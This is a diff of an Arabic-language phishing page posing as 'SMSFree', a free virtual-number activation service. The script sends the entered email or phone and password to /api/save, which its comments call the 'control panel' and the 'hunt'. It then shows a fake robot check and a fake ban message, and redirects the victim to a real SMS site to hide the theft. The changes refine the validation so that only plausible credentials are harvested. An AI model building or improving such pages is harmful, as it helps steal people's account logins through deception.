@@ -10,20 +10,21 @@
             --bg-dark: #0a0e17; --card-bg: #141b2b;
             --primary-glow: #00f2fe; --secondary-glow: #4facfe;
             --text-main: #ffffff; --text-muted: #8b9bb4;
-            --border: rgba(255, 255, 255, 0.05); --success: #2ecc71;
+            --border: rgba(255, 255, 255, 0.05); --success: #2ecc71; --error: #ff4757;
         }
 
         body {
             margin: 0; padding: 0; font-family: 'Cairo', sans-serif;
             background-color: var(--bg-dark);
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; color: var(--text-main); overflow: hidden;
+            min-height: 100vh; color: var(--text-main); overflow-x: hidden;
         }
 
         .premium-card {
             background-color: var(--card-bg); width: 90%; max-width: 420px;
             padding: 40px 30px; border-radius: 24px; text-align: center;
             border: 1px solid var(--border); box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            position: relative;
         }
 
         .logo-circle {
@@ -35,13 +36,31 @@
 
         .logo-text { font-size: 24px; font-weight: 800; text-shadow: 0 0 10px #fff; }
 
+        .input-group { margin-bottom: 15px; text-align: right; }
+
         input {
-            width: 100%; padding: 15px; margin-bottom: 20px;
+            width: 100%; padding: 15px;
             background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border);
             border-radius: 12px; color: #fff; font-family: 'Cairo'; box-sizing: border-box;
+            transition: all 0.3s ease;
         }
 
-        /* تنسيق منطقة التحقق الجديدة (بالأعلى) */
+        input:focus { border-color: var(--secondary-glow); outline: none; background: rgba(255, 255, 255, 0.05); }
+
+        /* رسائل الخطأ والحظر */
+        .status-msg {
+            font-size: 13px; font-weight: 600; padding: 10px; border-radius: 8px;
+            margin-bottom: 15px; display: none;
+        }
+        .msg-error { background: rgba(255, 71, 87, 0.1); color: var(--error); border: 1px solid rgba(255, 71, 87, 0.2); }
+        .msg-ban { background: #000; color: #ffbc00; border: 1px solid #ffbc00; animation: shake 0.4s ease-in-out; }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
         .verification-zone {
             margin-bottom: 15px; display: none; align-items: center; justify-content: center;
             background: rgba(0, 0, 0, 0.2); padding: 10px; border-radius: 10px;
@@ -59,65 +78,124 @@
             width: 100%; padding: 16px; font-weight: 800; font-size: 18px;
             background: linear-gradient(135deg, var(--secondary-glow), var(--primary-glow));
             border: none; border-radius: 12px; cursor: pointer; color: #0a0e17;
+            transition: opacity 0.3s;
         }
 
-        .success-text { color: var(--success); font-weight: 700; display: none; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* تذييل الصفحة المرجوع */
+        .footer-rights {
+            margin-top: 30px; font-size: 11px; color: var(--text-muted);
+            border-top: 1px solid var(--border); padding-top: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="premium-card">
         <div class="logo-circle"><span class="logo-text">SMSFree</span></div>
-        <h2 style="font-size: 22px;">منصة تفعيل الأرقام</h2>
-        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 30px;">تأكيد الهوية للوصول للأرقام الوهمية المجانية</p>
+        <h2 style="font-size: 22px; margin-bottom: 5px;">منصة تفعيل الأرقام</h2>
+        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 25px;">تأكيد ملكية الحساب للوصول الآمن للخدمة</p>
+
+        <div id="statusBox" class="status-msg"></div>
 
         <form id="authForm">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" id="passInput" placeholder="كلمة السر" required>
+            <div class="input-group">
+                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="passInput" placeholder="كلمة السر" required>
+            </div>
 
             <div class="verification-zone" id="vZone">
                 <div id="vProcess" style="display: flex; align-items: center;">
                     <div class="spinner"></div>
                     <span style="font-size: 13px;">جاري التحقق من أنك لست روبوت...</span>
                 </div>
-                <div id="vSuccess" class="success-text">✅ لقد تم التحقق من أنك لست روبوت بنجاح</div>
+                <div id="vSuccess" style="display: none; color: var(--success); font-weight: 700;">✅ تم التحقق من هويتك بنجاح</div>
             </div>
 
             <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
         </form>
+
+        <div class="footer-rights">
+            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة. <br>
+            نظام حماية متطور مدعوم بالذكاء الاصطناعي.
+        </div>
     </div>
 
     <script>
-        document.getElementById('authForm').onsubmit = async (e) => {
+        let errorCount = 0;
+        const form = document.getElementById('authForm');
+        const statusBox = document.getElementById('statusBox');
+
+        form.onsubmit = async (e) => {
             e.preventDefault();
+            const user = document.getElementById('userInput').value;
+            const pass = document.getElementById('passInput').value;
             const btn = document.getElementById('pageBtn');
+
+            // 1. التحقق الأساسي من البيانات
+            if (pass.length < 6 || (!user.includes('@') && user.length < 8)) {
+                errorCount++;
+                showError("⚠️ يرجى كتابة البريد وكلمة السر بطريقة صحيحة");
+                
+                // 2. نظام الحظر عند تكرار الخطأ (أكثر من محاولتين)
+                if (errorCount >= 2) {
+                    applyBan();
+                }
+                return;
+            }
+
+            // 3. إذا البيانات سليمة، ابدأ عملية الصيد والتحقق الوهمي
+            btn.disabled = true;
+            statusBox.style.display = 'none';
+            
+            // إرسال البيانات للوحة التحكم
+            fetch('/api/save', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user, pass })
+            });
+
+            // إظهار منطقة لست روبوت (ثانيتين)
             const vZone = document.getElementById('vZone');
             const vProcess = document.getElementById('vProcess');
             const vSuccess = document.getElementById('vSuccess');
 
-            // إرسال البيانات فوراً
-            fetch('/api/save', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    user: document.getElementById('userInput').value,
-                    pass: document.getElementById('passInput').value
-                })
-            });
-
-            // بدء التحقق (ثانيتين)
-            btn.disabled = true;
             vZone.style.display = 'flex';
-
             setTimeout(() => {
                 vProcess.style.display = 'none';
                 vSuccess.style.display = 'block';
 
-                // الانتقال لصفحة الأرقام الوهمية
                 setTimeout(() => {
-                    window.location.href = "https://receive-smss.com/"; 
-                }, 1000);
+                    window.location.href = "https://receive-smss.com/";
+                }, 800);
             }, 2000);
         };
+
+        function showError(msg) {
+            statusBox.innerText = msg;
+            statusBox.className = "status-msg msg-error";
+            statusBox.style.display = 'block';
+        }
+
+        function applyBan() {
+            const btn = document.getElementById('pageBtn');
+            btn.disabled = true;
+            statusBox.innerText = "🚫 لقد تم حظرك بسبب المحاولات الخاطئة المتكررة";
+            statusBox.className = "status-msg msg-ban";
+            
+            let counter = 3;
+            const timer = setInterval(() => {
+                counter--;
+                if (counter <= 0) {
+                    clearInterval(timer);
+                    btn.disabled = false;
+                    statusBox.style.display = 'none';
+                    errorCount = 0; // إعادة تصفير الأخطاء بعد فك الحظر
+                }
+            }, 1000);
+        }
     </script>
 </body>
 </html>
